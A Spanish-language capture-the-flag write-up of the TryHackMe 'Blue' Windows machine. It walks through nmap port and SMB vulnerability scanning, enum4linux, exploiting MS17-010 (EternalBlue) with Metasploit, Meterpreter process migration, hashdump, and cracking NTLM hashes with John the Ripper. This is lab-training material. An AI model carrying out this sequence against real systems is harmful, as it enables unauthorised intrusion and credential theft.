# Blue

Conceptos clave: Enum4linux, Hash dumping, John the Ripper, MS17-010 (EternalBlue), Metasploit, Meterpreter, NTLM cracking, Nmap NSE scripts, Port scanning, Process migration, Reconnaissance, SMB enumeration, Service enumeration, Windows enumeration
Dificultad: Fácil
Fecha: 13 de junio de 2026

## Resumen

Compromiso de **Blue (Windows)** explotando **MS17-010 (EternalBlue)** para obtener una sesión **Meterpreter** como `NT AUTHORITY\SYSTEM`, seguido de **dump de hashes** y crackeo de credenciales con **John the Ripper** para completar las flags.

## 1. Reconocimiento (Recon)

### 1.1 Conectividad

```bash
ping -c 1 <IP>
```

### 1.2 Escaneo de puertos

- Escaneo TCP completo (misma metodología que otras máquinas) para identificar superficie de ataque:

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn -oN allPorts <IP>
```

Hallazgos principales:

- Muchos puertos `>1000` expuestos con **MSRPC**
- Puertos críticos:
    - `135/tcp` (MSRPC)
    - `139/tcp` (netbios-ssn / NetBIOS)
    - `445/tcp` (SMB)

### 1.3 Enumeración y detección de vulnerabilidades SMB

- Detección de versión y checks de vulnerabilidades con scripts de Nmap (SMB + vuln):

```bash
nmap -p 135,139,445 --script "smb* and vuln" -sV -oN vulnPorts <IP>
```

Resultado relevante:

- El host reportó vulnerabilidad a **MS17-010**.

## 2. Acceso Inicial (Initial Access)

### 2.1 Intentos de enumeración SMB

- Intento de conexión/enumeración por SMB (sin éxito para acceso directo).
- Enumeración adicional con `enum4linux` para buscar usuarios/recursos (sin hallazgos explotables claros):

```bash
enum4linux -a <IP>
```

### 2.2 Explotación con Metasploit (EternalBlue)

- Lanzamiento de Metasploit:

```bash
msfconsole
```

- Selección del exploit **EternalBlue** para **MS17-010** (SMB):
    - Configuración de parámetros:
        - `RHOSTS <IP>`
        - `LHOST <TU_IP>`
- Ejecución exitosa del exploit y obtención de sesión.

### 2.3 Upgrade a Meterpreter y control de sesiones

- Se dejó la shell inicial en segundo plano (`Ctrl+Z`) y se gestionaron sesiones:

```
sessions
sessions -i <ID>
```

Resultado:

- Sesión **Meterpreter** activa con privilegios `NT AUTHORITY\SYSTEM`.

## 3. Post-explotación / “Escalada” (Windows)

### 3.1 Migración de proceso

- Enumeración para identificar un proceso adecuado y migración:

```
ps
migrate <PID>
```

(Con el objetivo de estabilizar la sesión y operar dentro de un proceso en contexto de `SYSTEM`.)

### 3.2 Dump de hashes

- Extracción de hashes con Meterpreter:

```
hashdump
```

Se obtuvieron 3 hashes; se trabajó específicamente el del usuario **Jon** (el requerido por TryHackMe).

### 3.3 Crackeo con John the Ripper

- En máquina local (Parrot), crackeo de hash NTLM con `rockyou.txt`:

```bash
john --format=NT --wordlist=../rockyou.txt hashes.txt
john --show --format=NT hashes.txt
```

## 4. Flags

Se localizaron las 2 flags solicitadas, en rutas bajo el sistema, incluyendo:

- `C:\Windows\System32\config\`
- `C:\Users\Jon\`